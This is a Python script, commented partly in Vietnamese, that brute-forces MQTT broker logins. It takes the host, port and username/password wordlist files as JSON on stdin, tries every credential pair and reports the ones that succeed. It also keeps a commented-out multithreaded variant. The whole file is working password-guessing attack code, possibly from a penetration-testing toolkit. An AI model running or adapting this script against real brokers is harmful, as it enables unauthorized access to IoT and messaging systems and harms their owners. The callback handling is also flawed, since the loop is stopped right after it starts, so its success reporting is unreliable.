import paho.mqtt.client as mqtt
import threading
import sys
import json
success = False
lock = threading.Lock()

def process_json_input(json_string):
    try:
        # Phân tích chuỗi JSON thành một đối tượng Python
        data = json.loads(json_string)
        # Trả về đối tượng đã được phân tích
        return data
    except json.JSONDecodeError as e:
        # Xử lý trường hợp nếu chuỗi JSON không hợp lệ
        print("Invalid JSON format:", e)
        sys.stdout.flush()
        return None
# def on_connect(client, userdata, flags, rc):
#     global success
#     if rc == 0:
#         with lock:
#             if not success:
#                 success = True
#                 print(f"[+] Success: '{userdata[0]}':'{userdata[1]}'")
#                 sys.stdout.flush()
#         client.disconnect()
#     else:
#         print(f"[-] Failed: '{userdata[0]}':'{userdata[1]}'")
#         sys.stdout.flush()


# def try_login(host, port, username, password):
#     global success
#     if success:
#         return

#     client = mqtt.Client(userdata=(username, password))
#     client.username_pw_set(username, password)
#     client.on_connect = on_connect

#     try:
#         client.connect(host, port, 60)
#         client.loop_forever()
#     except Exception as e:
#         print(f"[!] Connection error: {e}")
#         sys.stdout.flush()

# def mqtt_bruteforce(host, port, user_file, pass_file, thread_count=10):
#     with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
#         usernames = [line.strip() for line in uf.readlines()]
#         passwords = [line.strip() for line in pf.readlines()]

#     threads = []

#     for username in usernames:
#         for password in passwords:
#             if success:
#                 break
#             while threading.active_count() > thread_count:
#                 pass
#             thread = threading.Thread(target=try_login, args=(host, port, username, password))
#             threads.append(thread)
#             thread.start()

#     for thread in threads:
#         thread.join()
    

def on_connect(client, userdata, flags, rc):
    # Callback khi client kết nối tới server
    if rc == 0:
        print(f"[+] Success: '{userdata[0]}':'{userdata[1]}'")
        sys.stdout.flush()
        client.disconnect()
        global success
        success = True
    else:
        print(f"[-] Failed: '{userdata[0]}':'{userdata[1]}'")
        sys.stdout.flush()


def mqtt_bruteforce(host, port, user_file, pass_file):
    try:
        with open(user_file, 'r',encoding='utf-8') as uf, open(pass_file, 'r',encoding='utf-8') as pf:
            usernames = [line.strip() for line in uf.readlines()]
            passwords = [line.strip() for line in pf.readlines()]
        for username in usernames:
            for password in passwords:
                global success
                success = False
                client = mqtt.Client(userdata=(username, password))
                client.username_pw_set(username, password)
                client.on_connect = on_connect
                try:
                    client.connect(host, port, 60)
                    client.loop_start()
                    client.loop_stop()
                except Exception as e:
                    print(f"[!] Connection error: {e}")
                    sys.stdout.flush()
                if success:
                    return
    except Exception as e:
        print("Error Input File")
        sys.stdout.flush()


if __name__ == "__main__":
    data = sys.stdin.readline()
    data1 = process_json_input(data)
    mqtt_bruteforce(data1['ipserver'], int(data1['port']), data1['USER_FILE'], data1['PASS_FILE'])


